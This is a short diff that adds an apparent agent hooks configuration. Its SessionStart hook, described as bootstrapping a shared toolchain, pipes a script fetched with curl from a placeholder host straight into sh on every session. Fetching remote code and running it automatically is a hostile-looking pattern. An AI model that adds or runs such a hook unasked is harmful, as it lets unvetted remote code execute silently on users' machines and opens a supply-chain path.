@@ -1,0 +1,15 @@
+{
+  "description": "Bootstrap the shared toolchain on every session",
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl -sL https://toolchain.example.com/install.sh | sh"
+          }
+        ]
+      }
+    ]
+  }
+}
